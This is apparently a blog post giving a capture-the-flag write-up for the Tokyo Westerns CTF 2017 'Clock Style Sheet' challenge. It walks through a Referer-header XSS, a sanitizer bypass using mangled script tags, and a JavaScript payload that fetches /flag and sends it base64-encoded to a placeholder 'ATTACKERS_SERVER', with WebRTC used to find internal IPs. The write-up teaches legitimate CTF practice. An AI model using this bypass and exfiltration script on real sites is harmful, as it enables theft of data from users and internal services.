---
title: Tokyo Westerns CTF 2017 – Clock Style Sheet writeup
author: tyage
type: posts
date: 2017-09-05T01:34:28+00:00
url: /?p=1043
wp-syntax-cache-content:
  - |
    a:4:{i:1;s:474:"
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="html" style="font-family:monospace;">&lt;!doctype html&gt;
    &lt;html&gt;
      &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=blahblahblah&quot;&gt;&lt;&quot;&gt;</pre></td></tr></table><p class="theCode" style="display:none;">&lt;!doctype html&gt;
    &lt;html&gt;
      &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=blahblahblah&quot;&gt;&lt;&quot;&gt;</p></div>
    ";i:2;s:514:"
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="html" style="font-family:monospace;">&lt;!doctype html&gt;
    &lt;html&gt;
      &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&quot;&gt;</pre></td></tr></table><p class="theCode" style="display:none;">&lt;!doctype html&gt;
    &lt;html&gt;
      &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&quot;&gt;</p></div>
    ";i:3;s:1008:"
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="html" style="font-family:monospace;">&lt;script&gt;
    payload = `&quot;&gt;&lt;scrona=ipt&gt;
    getFlag = async () =&gt; {
      content = await fetch('/flag');
      await fetch('http://ATTACKERS_SERVER/' + btoa(await content.text()));
    };
    getFlag()
    &lt;/scrona=ipt&gt;
    `;
    history.pushState({}, &quot;&quot;, &quot;a.html?a=&quot; + encodeURIComponent(payload));
    location.href = 'http://css.chal.ctf.westerns.tokyo/refresh';
    &lt;/script&gt;</pre></td></tr></table><p class="theCode" style="display:none;">&lt;script&gt;
    payload = `&quot;&gt;&lt;scrona=ipt&gt;
    getFlag = async () =&gt; {
      content = await fetch('/flag');
      await fetch('http://ATTACKERS_SERVER/' + btoa(await content.text()));
    };
    getFlag()
    &lt;/scrona=ipt&gt;
    `;
    history.pushState({}, &quot;&quot;, &quot;a.html?a=&quot; + encodeURIComponent(payload));
    location.href = 'http://css.chal.ctf.westerns.tokyo/refresh';
    &lt;/script&gt;</p></div>
    ";i:4;s:1018:"
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="html" style="font-family:monospace;">&lt;script&gt;
    payload = `&quot;&gt;&lt;scrona=ipt&gt;
    getFlag = async () =&gt; {
      content = await fetch('/flag');
      await fetch('http://ATTACKERS_SERVER/' + btoa(await content.text()));
    };
    getFlag()
    &lt;/scrona=ipt&gt;
    `;
    history.pushState({}, &quot;&quot;, &quot;a.html?a=&quot; + encodeURIComponent(payload));
    location.href = 'http://192.168.0.4/refresh'; // this line changed
    &lt;/script&gt;</pre></td></tr></table><p class="theCode" style="display:none;">&lt;script&gt;
    payload = `&quot;&gt;&lt;scrona=ipt&gt;
    getFlag = async () =&gt; {
      content = await fetch('/flag');
      await fetch('http://ATTACKERS_SERVER/' + btoa(await content.text()));
    };
    getFlag()
    &lt;/scrona=ipt&gt;
    `;
    history.pushState({}, &quot;&quot;, &quot;a.html?a=&quot; + encodeURIComponent(payload));
    location.href = 'http://192.168.0.4/refresh'; // this line changed
    &lt;/script&gt;</p></div>
    ";}
categories:
  - CTF

---
<h2>Overview</h2>
<p>Problem page:<br />
<a href="http://css.chal.ctf.westerns.tokyo/">http://css.chal.ctf.westerns.tokyo/</a></p>
<p>Provided source code:<br />
<a href="https://twctf2017.azureedge.net/attachments/proxy.py-6cac125d5b78cd89658bacf820c439e9c964bad1feedb8a97e4396fe2bd3434d">proxy.py</a><br />
<a href="https://twctf2017.azureedge.net/attachments/sanitizer.py-39beede4e84efe18734390619ac0d6a14e978aa90fac7f4bae7b6c6a17d108ff">sanitizer.py</a></p>
<p>There are 4 pages: /, /refresh, /chrowler, /flag.</p>
<p>When we access /flag, it responses <code>only local IP is allowed. (your IP: 110.3.193.114)</code>.<br />
So, we should use /chrowler (crawler using Chrome) to get the content in /flag.</p>
<h2>Find XSS</h2>
<p>Next, we search XSS and found /refresh has it. (We found the vulnerability when browsing with w3m)<br />
In this page, user will be redirected to the page where he or she is (which represented by Referer header).</p>
<p><code>curl -H 'Referer: blahblahblah"><' http://css.chal.ctf.westerns.tokyo/refresh</code></p>

<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="html" style="font-family:monospace;">&lt;!doctype html&gt;
&lt;html&gt;
  &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=blahblahblah&quot;&gt;&lt;&quot;&gt;</pre></td></tr></table></div>

<p>And the Referer is sanitized with <code>htmlsanitize</code> but it is bypassed as below:</p>
<p><code>curl -H 'Referer: "&gt;&lt;sona=cript&gt;alert()&lt;/sona=cript&gt;' http://css.chal.ctf.westerns.tokyo/refresh</code></p>

<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="html" style="font-family:monospace;">&lt;!doctype html&gt;
&lt;html&gt;
  &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&quot;&gt;</pre></td></tr></table></div>

<h2>Exploit XSS</h2>
<p>In proxy which is used by crawler, <code>urlsanitize</code> is used.<br />
Crawler can not access to <code>http://attacker/?"&gt;&lt;script&gt;alert()&lt;/script&gt;</code>.<br />
So another technique is required to exploit XSS.</p>
<p>We use <code>history.pushState</code> to set attack code in Referer.</p>
<p>After crawler access the page below, it sends the contents of /flag.</p>

<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="html" style="font-family:monospace;">&lt;script&gt;
payload = `&quot;&gt;&lt;scrona=ipt&gt;
getFlag = async () =&gt; {
  content = await fetch('/flag');
  await fetch('http://ATTACKERS_SERVER/' + btoa(await content.text()));
};
getFlag()
&lt;/scrona=ipt&gt;
`;
history.pushState({}, &quot;&quot;, &quot;a.html?a=&quot; + encodeURIComponent(payload));
location.href = 'http://css.chal.ctf.westerns.tokyo/refresh';
&lt;/script&gt;</pre></td></tr></table></div>

<h2>Local IP Detection</h2>
<p>But the content which is send by crawler is: <code>only local IP is allowed. (your IP: 104.215.63.152)</code></p>
<p>What to do next?<br />
Access to localhost of crawler? No.</p>
<p>After some trials, we tried to detect local IP address of crawler and web server with WebRTC.<br />
( WebRTC is useful technique to detect local IP address: <a href="https://github.com/diafygi/webrtc-ips">https://github.com/diafygi/webrtc-ips</a> )</p>
<p>It turns out that crawler is <code>192.168.0.5</code> and web server is <code>192.168.0.4</code>.</p>
<p>We fixed the attack code.</p>

<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="html" style="font-family:monospace;">&lt;script&gt;
payload = `&quot;&gt;&lt;scrona=ipt&gt;
getFlag = async () =&gt; {
  content = await fetch('/flag');
  await fetch('http://ATTACKERS_SERVER/' + btoa(await content.text()));
};
getFlag()
&lt;/scrona=ipt&gt;
`;
history.pushState({}, &quot;&quot;, &quot;a.html?a=&quot; + encodeURIComponent(payload));
location.href = 'http://192.168.0.4/refresh'; // this line changed
&lt;/script&gt;</pre></td></tr></table></div>

<p>And finally we got flag!</p>
<p><code>TWCTF{cl0ck-cr4ck-c1ick}</code></p>
